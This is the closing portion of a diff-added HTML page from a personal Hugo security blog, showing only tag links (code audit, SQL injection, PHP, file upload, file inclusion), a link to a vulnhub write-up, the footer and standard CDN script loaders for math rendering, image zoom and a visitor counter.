+                
+                
+                
+                
+                    
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>代码审计</a>
+                
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>SQL注入</a>
+                
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/php/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>php</a>
+                
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>文件上传</a>
+                
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>文件包含</a>
+                
+            
+        </div>
+    
+
+
+
+        
+
+
+        
+
+
+        
+    
+        
+        
+    
+    
+    
+    
+        <ul class="post-nav">
+            
+            
+                <li class="post-nav-next">
+                    <a href="/posts/vuln_harrypotter_aragog/" rel="next">[vulnhub]HarryPotter Aragog &gt;</a>
+                </li>
+            
+        </ul>
+    
+
+
+
+        
+
+
+    </div>
+</main>
+
+
+            
+    <div id="back-to-top" class="back-to-top">
+        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
+    </div>
+
+
+            
+    <footer id="footer" class="footer">
+        <div class="footer-inner">
+            <div class="site-info">©&nbsp;2020–2021&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon footer-icon"><path d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"/></svg>&nbsp;tyskill</div><div class="powered-by">Powered by <a href="https://github.com/gohugoio/hugo" target="_blank" rel="noopener">Hugo</a> | Theme is <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a></div><div class="custom-footer">地不长无名之草，天不生无用之人</div>
+                <div class="busuanzi-site-uv-and-pv">
+                    <span id="busuanzi_container_site_uv">本站访客数&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon busuanzi-site-uv"><path d="M224 256c70.7 0 128-57.3 128-128S294.7 0 224 0 96 57.3 96 128s57.3 128 128 128zm89.6 32h-16.7c-22.2 10.2-46.9 16-72.9 16s-50.6-5.8-72.9-16h-16.7C60.2 288 0 348.2 0 422.4V464c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48v-41.6c0-74.2-60.2-134.4-134.4-134.4z"/></svg>&nbsp;<span id="busuanzi_value_site_uv"></span></span>&nbsp;|&nbsp;<span id="busuanzi_container_site_pv">本站访问量&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" class="icon busuanzi-site-pv"><path d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"/></svg>&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+                </div>
+
+            
+
+
+            
+        </div>
+    </footer>
+
+
+        </div>
+        
+
+        
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.css" integrity="sha256-gPJfuwTULrEAAcI3X4bALVU/2qBU+QY/TpoD3GO+Exw=" crossorigin="anonymous">
+<script>
+    if (typeof renderMathInElement === 'undefined') {
+        var getScript = (options) => {
+            var script = document.createElement('script');
+            script.defer = true;
+            script.crossOrigin = 'anonymous';
+            Object.keys(options).forEach((key) => {
+                script[key] = options[key];
+            });
+            document.body.appendChild(script);
+        };
+        getScript({
+            src: 'https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.js',
+            integrity: 'sha256-YTW9cMncW/ZQMhY69KaUxIa2cPTxV87Uh627Gf5ODUw=',
+            onload: () => {
+                getScript({
+                    src: 'https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/contrib/mhchem.min.js',
+                    integrity: 'sha256-yzSfYeVsWJ1x+2g8CYHsB/Mn7PcSp8122k5BM4T3Vxw=',
+                    onload: () => {
+                        getScript({
+                            src: 'https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/contrib/auto-render.min.js',
+                            integrity: 'sha256-fxJzNV6hpc8tgW8tF0zVobKa71eTCRGTgxFXt1ZpJNM=',
+                            onload: () => {
+                                renderKaTex();
+                            }
+                        });
+                    }
+                });
+            }
+        });
+    } else {
+        renderKaTex();
+    }
+    function renderKaTex() {
+        renderMathInElement(
+            document.body,
+            {
+                delimiters: [
+                    {left: "$$", right: "$$", display: true},
+                    {left: "\\[", right: "\\]", display: true},
+                    {left: "$", right: "$", display: false},
+                    {left: "\\(", right: "\\)", display: false}
+                ]
+            }
+        );
+    }
+</script>
+
+
+
+
+
+
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>
+
+<script>
+    mediumZoom(document.querySelectorAll('div.post-body img'), {
+        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
+    })
+</script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js" type="module" defer></script>
+
+
+
+
+    
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+
+
+
+
+    </body>
+</html>
